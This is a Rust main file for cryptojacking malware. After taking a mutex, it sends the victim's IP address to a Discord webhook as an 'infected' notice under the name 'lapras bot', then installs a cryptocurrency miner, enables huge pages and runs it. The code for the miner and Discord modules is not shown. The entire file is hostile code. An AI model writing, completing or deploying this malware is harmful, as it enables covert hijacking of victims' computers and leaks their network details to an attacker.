mod discord;
mod miner;
mod mutex;

use discord::Discord;
use miner::Miner;

use env_logger::{Builder, Env};
use log::info;


fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    match mutex::lock() {
        Some(_) => {
            let mut discord = Discord::new();

            discord.set_username("lapras bot");

            discord.set_content(format!("infected: {:?}", discord.get_ip()));

            info!("response: {:?}", discord.send().map(|response| response.status()));

            let miner = Miner::new();

            miner.install()?;

            miner.enable_huge_pages();

            let mut handle = miner.run()?;

            handle.wait()?;
        },
        None => {},
    }

    Ok(())
}


